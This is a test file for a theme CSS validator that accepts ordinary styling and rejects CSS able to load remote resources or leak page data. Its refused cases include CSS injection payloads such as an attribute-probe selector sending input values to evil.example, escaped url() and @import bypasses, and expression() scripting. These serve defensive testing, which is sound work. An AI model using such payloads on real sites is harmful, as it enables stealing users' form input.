import { describe, expect, it } from "vite-plus/test";

import {
  THEME_CSS_MAX_LENGTH,
  themeCssProblem,
  themeCssPropertyRefused,
  themeCssValueRefused,
} from "./themeCss.ts";

const PNG =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGNgYGD4DwABBAEAwS2OUAAAAABJRU5ErkJggg==";

describe("themeCssProblem", () => {
  it.each([
    ["colors and layout", "[data-chat-header] { background: #102030; color: rgb(1 2 3); }"],
    ["hiding a button", '[data-slot="button"] { display: none !important; }'],
    [
      "an animation",
      "@keyframes spin { to { transform: rotate(1turn); } } .x { animation: spin 1s infinite; }",
    ],
    [
      "media, supports, container and layer",
      "@layer a; @media (min-width: 1px) { @supports (display: grid) { @container (min-width: 1px) { .x { color: red } } } }",
    ],
    ["an inline png", `.x { background-image: url("${PNG}"); }`],
    ["an unquoted inline png", `.x { background-image: url(${PNG}); }`],
    ["an element of the page", ".x { filter: url(#blur); mask: url('#m'); }"],
    ["scroll-behavior, which is not behavior", "html { scroll-behavior: smooth; }"],
    ["an email in content", '.x::after { content: "me at example.com"; }'],
  ])("accepts %s", (_case, css) => {
    expect(themeCssProblem(css)).toBeNull();
  });

  it.each([
    ["a remote url()", ".x { background: url(https://example.com/a.png) }", "url()"],
    ["a quoted remote url()", '.x { background: url("https://example.com/a.png") }', "url()"],
    ["a path on the Hub", '.x { background: url("/api/thing") }', "url()"],
    [
      "a no-break space before data:",
      '.x { background: url(" data:image/png;base64,AA") }',
      "url()",
    ],
    [
      "a space inside the quotes before data:",
      '.x { background: url(" data:image/png;base64,AA") }',
      "url()",
    ],
    ["an svg data address", '.x { background: url("data:image/svg+xml,<svg/>") }', "url()"],
    ["data that is not an image", '.x { background: url("data:text/html,hi") }', "url()"],
    [
      "an attribute probe",
      'input[value^="a"] { background: url(https://evil.example/a) }',
      "url()",
    ],
    ["upper case URL()", ".x { background: URL(https://example.com/a) }", "url()"],
    ["a url() inside a string", '.x::after { content: "url(https://example.com/a)" }', "url()"],
    [
      "a url() hidden after a quoted data string",
      `.x { content: "url('data:" url("https://evil.example/a") "'" }`,
      "url()",
    ],
    ["@import with a string", '@import "https://example.com/a.css";', "@import"],
    ["@import with url()", "@import url(https://example.com/a.css);", "@import"],
    [
      "@font-face",
      "@font-face { font-family: x; src: url(https://example.com/f.woff2) }",
      "@font-face",
    ],
    [
      "@font-face with only a local source",
      "@font-face { font-family: x; src: local(Arial) }",
      "@font-face",
    ],
    ["a src declaration", ".x { src: local(Arial) }", "src:"],
    ["src()", '.x { background-image: src("https://example.com/a") }', "src()"],
    [
      "image-set()",
      '.x { background-image: image-set("https://example.com/a.png" 1x) }',
      "image-set()",
    ],
    [
      "-webkit-image-set()",
      '.x { background-image: -webkit-image-set("a.png" 1x) }',
      "image-set()",
    ],
    ["image()", '.x { background-image: image("https://example.com/a.png") }', "image()"],
    ["cross-fade()", ".x { background-image: cross-fade(red, blue 50%) }", "cross-fade()"],
    ["element()", ".x { background: -moz-element(#a) }", "element()"],
    ["attr()", ".x::after { content: attr(data-secret) }", "attr()"],
    ["expression()", ".x { width: expression(alert(1)) }", "expression()"],
    ["behavior", ".x { behavior: url(a.htc) }", "behavior"],
    ["-moz-binding", ".x { -moz-binding: url(a.xml#b) }", "-moz-binding"],
    ["an escaped url", ".x { background: u\\72l(https://example.com/a) }", "backslash"],
    ["an escaped @import", "@\\69mport 'https://example.com/a.css';", "backslash"],
    ["an escaped image-set", '.x { background: im\\61ge-set("a.png" 1x) }', "backslash"],
    ["an escaped expression", ".x { width: e\\78pression(1) }", "backslash"],
    ["an escaped -moz-binding", ".x { -moz-bind\\69ng: none }", "backslash"],
    [
      "a custom property holding a url",
      ":root { --leak: url(https://example.com/a) } .x { background: var(--leak) }",
      "url()",
    ],
    ["@namespace", "@namespace svg url(http://www.w3.org/2000/svg);", "url()"],
    [
      "@property",
      '@property --x { syntax: "<color>"; inherits: false; initial-value: red; }',
      "@property",
    ],
    ["@counter-style", "@counter-style c { system: cyclic; symbols: a; }", "@counter-style"],
    [
      "@import hidden in a comment",
      "/* @import url(https://example.com/a.css); */ .x { color: red }",
      "@import",
    ],
    ["a blocked word split from a comment", ".x{color:red}/**/@import 'a.css';", "@import"],
  ])("refuses %s", (_case, css, word) => {
    expect(themeCssProblem(css)).toContain(word);
  });

  it("refuses empty CSS and CSS over the limit, and says the limit", () => {
    expect(themeCssProblem("  \n")).toContain("empty");
    const atLimit = `/*${"x".repeat(THEME_CSS_MAX_LENGTH - 4)}*/`;
    expect(atLimit).toHaveLength(THEME_CSS_MAX_LENGTH);
    expect(themeCssProblem(atLimit)).toBeNull();
    expect(themeCssProblem(`${atLimit} `)).toContain("50,000");
  });
});

describe("parsed values and properties", () => {
  it.each([
    ['url("https://example.com/a")', true],
    ['url("/api/thing")', true],
    ['image-set("https://example.com/a" 1x)', true],
    ["v\\61r(--none, u\\72l(https://example.com/a))", true],
    [`url("${PNG}")`, false],
    ['url("#blur")', false],
    ["var(--pattern)", false],
    ["red", false],
  ])("value %s refused: %s", (value, refused) => {
    expect(themeCssValueRefused(value)).toBe(refused);
  });

  it("refuses the properties that load or bind whatever their value", () => {
    expect(themeCssPropertyRefused("src")).toBe(true);
    expect(themeCssPropertyRefused("behavior")).toBe(true);
    expect(themeCssPropertyRefused("-moz-binding")).toBe(true);
    expect(themeCssPropertyRefused("scroll-behavior")).toBe(false);
  });
});
